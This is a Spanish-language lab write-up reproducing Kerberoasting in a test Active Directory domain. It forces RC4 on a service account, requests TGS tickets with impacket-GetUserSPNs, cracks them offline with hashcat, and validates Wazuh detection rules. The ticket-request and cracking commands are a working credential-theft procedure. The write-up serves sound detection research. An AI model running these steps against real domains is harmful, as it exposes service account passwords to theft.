# Kerberoasting en Active Directory

## MITRE ATT&CK T1558.003

Este escenario reproduce un ataque de Kerberoasting contra una cuenta de servicio controlada y analiza su detección mediante eventos de Windows y reglas personalizadas de Wazuh.

> Este laboratorio debe ejecutarse únicamente en una infraestructura propia y autorizada. Las contraseñas reales, tickets Kerberos y claves del laboratorio no se publican en este repositorio.

## Objetivos

- Crear una cuenta de servicio con un SPN.
- Generar un ticket TGS compatible con Kerberoasting.
- Observar el evento de seguridad 4769.
- Detectar una solicitud RC4 desde una IP no autorizada.
- Detectar tres solicitudes desde la misma IP en 120 segundos.
- Demostrar el cracking offline con una contraseña controlada.
- Comparar el comportamiento de RC4 y AES.
- Documentar falsos positivos, limitaciones y medidas defensivas.

## Arquitectura

| Sistema | Función | IP de laboratorio |
|---|---|---|
| Wazuh Manager | Análisis e indexación | `192.168.56.10` |
| DC01 | Active Directory y KDC | `192.168.56.20` |
| WS01 | Estación Windows | `192.168.56.30` |
| Kali-ATK01 | Equipo de pruebas | `192.168.56.40` |

## Cuenta controlada

| Elemento | Valor |
|---|---|
| Dominio | `lab.local` |
| Cuenta de servicio | `LAB\svc_sql` |
| SPN | `MSSQLSvc/DC01.lab.local:1433` |
| Cifrado vulnerable | RC4-HMAC |
| Evento principal | Windows Security 4769 |
| Regla individual | Wazuh 100040 |
| Regla correlacionada | Wazuh 100041 |

La contraseña de la cuenta no se publica. Debe introducirse interactivamente durante la preparación.

## Cómo funciona Kerberoasting

Kerberos utiliza tickets para que un usuario autenticado pueda acceder a los servicios del dominio sin enviar su contraseña a cada servidor.

Cuando un usuario necesita un servicio:

1. Obtiene un TGT del controlador de dominio.
2. Solicita un ticket TGS para el SPN del servicio.
3. El KDC emite un ticket protegido con una clave asociada a la cuenta que posee el SPN.
4. El usuario presenta el ticket al servicio.

En Kerberoasting, un usuario autenticado solicita el TGS y extrae su parte cifrada. Después prueba posibles contraseñas offline hasta encontrar una que genere la clave correcta.

El cracking offline:

- No produce un intento de inicio de sesión por cada contraseña.
- No provoca bloqueo de cuenta.
- No necesita seguir comunicándose con el controlador de dominio.
- Depende principalmente de la fortaleza de la contraseña y del cifrado utilizado.

## Preparación de DC01

Acceder a DC01 mediante SSH y entrar en PowerShell:

```powershell
ssh Administrator@192.168.56.20
powershell.exe -NoLogo -NoProfile
```

Cargar los módulos necesarios:

```powershell
Import-Module ServerManager
Install-WindowsFeature RSAT-AD-PowerShell -IncludeAllSubFeature
Import-Module ActiveDirectory
```

Crear o actualizar la cuenta controlada:

```powershell
$LabPassword = Read-Host 'Contraseña temporal de LAB\svc_sql' -AsSecureString
$Svc = Get-ADUser -Filter "SamAccountName -eq 'svc_sql'"

if ($null -eq $Svc) {
    New-ADUser `
        -Name 'svc_sql' `
        -SamAccountName 'svc_sql' `
        -UserPrincipalName 'svc_sql@lab.local' `
        -AccountPassword $LabPassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Description 'TFM - Cuenta controlada para Kerberoasting'
}

Set-ADAccountPassword `
    -Identity svc_sql `
    -Reset `
    -NewPassword $LabPassword

Enable-ADAccount -Identity svc_sql

Set-ADUser `
    -Identity svc_sql `
    -PasswordNeverExpires $true `
    -Description 'TFM - Cuenta controlada para Kerberoasting'
```

Registrar el SPN:

```powershell
$Spn = 'MSSQLSvc/DC01.lab.local:1433'
$Svc = Get-ADUser svc_sql -Properties ServicePrincipalName

setspn.exe -Q $Spn

if ($Svc.ServicePrincipalName -notcontains $Spn) {
    setspn.exe -S $Spn 'LAB\svc_sql'
}

setspn.exe -L 'LAB\svc_sql'
```

Configurar RC4 exclusivamente para la prueba controlada:

```powershell
Set-ADUser svc_sql -Replace @{'msDS-SupportedEncryptionTypes'=4}
```

Comprobar la cuenta:

```powershell
Get-ADUser svc_sql `
    -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,PasswordNeverExpires |
Format-List `
    SamAccountName,
    Enabled,
    PasswordNeverExpires,
    ServicePrincipalName,
    msDS-SupportedEncryptionTypes
```

Comprobar que no pertenece a grupos privilegiados:

```powershell
Get-ADPrincipalGroupMembership svc_sql |
    Select-Object Name,GroupScope,GroupCategory |
    Format-Table -AutoSize
```

## Activar la auditoría

```powershell
auditpol.exe `
    /set `
    /subcategory:"Kerberos Service Ticket Operations" `
    /success:enable `
    /failure:enable
```

Comprobarla:

```powershell
auditpol.exe `
    /get `
    /subcategory:"Kerberos Service Ticket Operations"
```

## Enumeración desde Kali

Comprobar si existen cuentas con SPN:

```bash
impacket-GetUserSPNs \
  -dc-ip 192.168.56.20 \
  'lab.local/Administrator'
```

Impacket solicitará la contraseña de la cuenta en lugar de incluirla en el historial de la terminal.

Resultado esperado:

```text
MSSQLSvc/DC01.lab.local:1433    svc_sql
```

## Solicitar el ticket TGS

```bash
impacket-GetUserSPNs \
  -dc-ip 192.168.56.20 \
  -request-user svc_sql \
  'lab.local/Administrator' \
  | tee /tmp/salida_kerberoast.txt
```

Extraer únicamente el material compatible con Hashcat:

```bash
grep '^\$krb5tgs\$' \
  /tmp/salida_kerberoast.txt \
  > /tmp/kerberoast_svc_sql.txt
```

Comprobarlo sin mostrar el ticket completo:

```bash
wc -l /tmp/kerberoast_svc_sql.txt
head -c 40 /tmp/kerberoast_svc_sql.txt
echo
```

El prefijo esperado es:

```text
$krb5tgs$23$
```

La correspondencia es:

```text
23 decimal = 0x17 hexadecimal = RC4-HMAC
```

## Generar tres solicitudes

Introducir la contraseña sin guardarla en el repositorio:

```bash
read -rsp 'Contraseña de LAB\Administrator: ' DOMAIN_PASSWORD
echo
```

Generar tres solicitudes:

```bash
for i in 1 2 3; do
  echo "Solicitud TGS $i de 3"

  impacket-GetUserSPNs \
    -dc-ip 192.168.56.20 \
    -request-user svc_sql \
    "lab.local/Administrator:${DOMAIN_PASSWORD}" \
    >/dev/null

  sleep 2
done

unset DOMAIN_PASSWORD
```

Resultados esperados:

- Primera solicitud: regla `100040`.
- Segunda solicitud: regla `100040`.
- Tercera solicitud: regla correlacionada `100041`.

## Cracking offline controlado

Crear un diccionario temporal. La contraseña real debe introducirse de forma interactiva:

```bash
read -rsp 'Contraseña controlada de svc_sql: ' SERVICE_PASSWORD
echo
```

```bash
printf '%s\n' \
  'Password123!' \
  "${SERVICE_PASSWORD}" \
  'Summer2026!' \
  > /tmp/diccionario_tfm.txt

unset SERVICE_PASSWORD
```

Ejecutar Hashcat:

```bash
hashcat \
  -m 13100 \
  -a 0 \
  /tmp/kerberoast_svc_sql.txt \
  /tmp/diccionario_tfm.txt \
  --potfile-path /tmp/kerberoast_svc_sql.pot
```

Mostrar el resultado:

```bash
hashcat \
  -m 13100 \
  /tmp/kerberoast_svc_sql.txt \
  --show \
  --potfile-path /tmp/kerberoast_svc_sql.pot
```

Eliminar los materiales sensibles después de documentar el resultado:

```bash
rm -f \
  /tmp/salida_kerberoast.txt \
  /tmp/kerberoast_svc_sql.txt \
  /tmp/diccionario_tfm.txt \
  /tmp/kerberoast_svc_sql.pot
```

## Resultado validado

La prueba generó:

| Evento | Regla | Resultado |
|---|---:|---|
| Primera solicitud RC4 | `100040` | Detectada |
| Segunda solicitud RC4 | `100040` | Detectada |
| Tercera solicitud en 120 segundos | `100041` | Correlacionada |
| Cracking offline | Hashcat 13100 | Contraseña controlada recuperada |

## Archivos relacionados

- [Lógica de detección](../../detections/kerberoasting.md)
- [Reglas de Wazuh](../../wazuh/rules/kerberoasting_rules.xml)
- [Evidencias](../../evidence/kerberoasting/README.md)
- [Mitigación y comparación con AES](../../docs/kerberoasting-remediation.md)

## Referencias

- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Microsoft — Evento 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Wazuh — Detección de ataques contra Active Directory](https://wazuh.com/blog/how-to-detect-active-directory-attacks-with-wazuh-part-1-of-2/)
- [Fortra Impacket — GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
